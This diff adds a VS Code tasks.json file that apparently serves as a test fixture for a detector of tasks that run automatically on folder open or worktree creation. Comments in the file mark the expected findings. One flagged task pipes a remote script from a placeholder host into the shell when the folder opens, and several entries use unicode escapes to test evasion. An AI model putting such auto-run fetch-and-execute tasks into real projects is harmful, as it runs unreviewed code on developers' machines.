@@ -1,0 +1,95 @@
+{
+  // See https://go.microsoft.com/fwlink/?LinkId=733558
+  // for the documentation about the tasks.json format
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "Setup",
+      "type": "shell",
+      "command": "node .claude/setup.mjs",
+      // ruleid: vscode-task-runs-automatically
+      "runOptions": { "runOn": "folderOpen" }
+    },
+    // ruleid: vscode-task-runs-automatically
+    { "label": "fetch", "type": "shell", "command": "curl -fsSL https://example.com/a.sh | sh", "runOptions": { "runOn": "FolderOpen" } },
+    {
+      "label": "worktree setup",
+      "type": "shell",
+      "command": "cp .env.example .env",
+      "runOptions": {
+        "instanceLimit": 1,
+        // ruleid: vscode-task-runs-automatically
+        "runOn":
+          "worktreeCreated"
+      }
+    },
+    {
+      "label": "watch",
+      "type": "npm",
+      "script": "watch",
+      "isBackground": true,
+      // ok: vscode-task-runs-automatically
+      // "runOptions": { "runOn": "folderOpen" }
+      "problemMatcher": "$tsc-watch"
+    },
+    {
+      "label": "build",
+      "type": "shell",
+      "command": "npm run build",
+      // ok: vscode-task-runs-automatically
+      "runOptions": { "runOn": "default", "reevaluateOnRerun": false }
+    },
+    {
+      "label": "lint",
+      "type": "shell",
+      "command": "npx eslint \"src/**/*.ts\"",
+      "options": { "cwd": "${workspaceFolder}/web" },
+      // ruleid: vscode-task-runs-automatically
+      "runOptions": { "runOn": "folderOpen" },
+      /* Globs in strings and this comment after the finding must not hide it. */
+      "problemMatcher": ["$eslint-stylish"]
+    },
+    {
+      "label": "sync",
+      "type": "shell",
+      "command": "echo synced",
+      // ruleid: vscode-task-runs-automatically
+      "runOptions": { "r\u0075nOn": "folder\u004fpen" }
+    },
+    {
+      "label": "warm cache",
+      "type": "shell",
+      "command": "echo warm",
+      // ruleid: vscode-task-runs-automatically
+      "runOptions": { "runOn": "\u0077orktreeCreated" }
+    },
+    /*
+    {
+      "label": "old setup, see https://example.com/HD-12",
+      "command": "echo old",
+      // ok: vscode-task-runs-automatically
+      "runOptions": { "runOn": "folderOpen" }
+    },
+    */
+    {
+      "label": "format",
+      "type": "shell",
+      "command": "echo fmt",
+      // ok: vscode-task-runs-automatically
+      "runOptions": { "runOn": "default" } /* "runOn": "folderOpen" was too slow */
+    },
+    {
+      "label": "escaped label",
+      // ok: vscode-task-runs-automatically
+      "l\u0061bel": "d\u0065fault",
+      "command": "echo hi"
+    },
+    {
+      "label": "docs",
+      "type": "shell",
+      // ok: vscode-task-runs-automatically
+      "command": "echo \"set runOn to folderOpen to start this with the folder\"",
+      "detail": "Do not set \"runOn\": \"folderOpen\" here"
+    }
+  ]
+}
